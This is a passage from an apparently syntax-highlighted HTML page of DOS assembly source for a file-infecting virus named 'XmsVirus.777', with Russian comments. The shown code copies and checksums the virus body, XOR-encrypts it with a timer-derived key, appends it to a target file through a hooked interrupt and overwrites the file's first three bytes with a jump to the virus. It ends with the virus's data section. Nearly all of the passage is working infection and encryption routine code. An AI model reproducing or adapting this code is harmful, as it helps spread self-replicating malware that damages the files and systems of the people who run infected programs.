</span><span class="sc5">L4</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">L4</span><span class="sc0">


</span><span class="sc1">;[Вычисляем контрольную сумму]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EndCrypt</span><span class="sc4">-</span><span class="sc5">Crypted</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">)+(</span><span class="sc5">EndCrypt</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">L5</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">L5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">)+(</span><span class="sc5">CRC</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">


</span><span class="sc1">;[Шифруем вирус]</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc5">L6</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">L6</span><span class="sc0">


</span><span class="sc1">;[Записываем вирус в файл]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc10">$</span><span class="sc0">


</span><span class="sc1">;[Перемещаем указатель в начало файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc10">$</span><span class="sc0">


</span><span class="sc1">;[Записываем команду перехода на вирус]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">New3b</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
</span><span class="sc5">RestTime</span><span class="sc10">$</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">RestTime</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                                ДАННЫЕ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">VirName</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'XmsVirus.777 -- Copyright (c) by DJ Sadovnikov'</span><span class="sc0">
</span><span class="sc5">Old3b</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc5">New3b</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">EndCrypt</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">

</span><span class="sc5">XXXNS</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'БЛЯNS'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CodeSize</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
</span><span class="sc5">CodeMem</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">CodeSize</span><span class="sc4">/</span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Buffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CodeSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">VirSize</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
</span><span class="sc5">VirMem</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">VirSize</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">


</span><span class="sc5">Code</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
</span></div></body>
</html>
